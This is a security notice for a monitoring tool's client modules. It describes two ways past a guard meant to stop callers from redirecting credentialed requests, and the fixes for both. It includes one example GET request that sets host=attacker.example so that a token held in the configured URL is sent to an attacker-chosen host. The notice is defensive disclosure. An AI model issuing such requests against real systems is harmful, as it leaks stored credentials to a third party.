---
title: "Two ways past the client host-override guard"
fixed_in: next
severity: "Medium"
modules: [NRDPClient, IcingaClient, SMTPClient, NSCAClient, NSCANgClient, NSCPClient]
action: conditional
---
The guard added in 0.19.0 (see
[Client credentials could be sent to a caller-chosen host](notices.md#client-credentials-could-be-sent-to-a-caller-chosen-host))
refuses a request that moves a credentialed target's destination. It decided
"credentialed" by looking for a `password` or `token` **key**, and it compared
the resulting address against the one it had recorded as configured. Both
tests could be stepped around.

#### A credential inside the configured address

A target may carry its secret in the URL rather than in a key of its own —
`address = https://nrdp.example.com/nrdp/submit.php?token=SECRET` is a
documented form, and so is `https://user:password@host/`. The key is called
`address`, so the guard saw no credentials to protect, while `host=` rewrote
only the host part and left the query string (and the token in it) intact:

```
GET /api/v1/queries/submit_nrdp/commands/execute?host=attacker.example&command=x&result=0&message=x
```

A value that carries a credential in its own text now counts as a configured
credential, whatever its key is named.

#### A selected target that names no address

`host=` is parsed before `target=` is applied, and applying a target recorded
whatever address was then in the container as that target's "configured" one.
A target that carries a credential but names no address of its own therefore
had the caller's host written down as its own, and the guard compared that host
against itself and let the credential travel.

A target now records only an address it actually names, and a credentialed
target that names none refuses a destination the request chose.

**What to do:** nothing, unless a target of yours carries its credential inside
`address` (a `?token=` / `?password=` query parameter, or `user:password@` in
the URL) *and* callers move its destination with `host=`, `port=` or
`address=`. That combination is now refused, as it already was for a target
with a separate `password` / `token` key. The remedies are the same: pass the
credential with the request, configure each destination as its own target and
select it with `target=`, or set `allow host override = true` on the target.
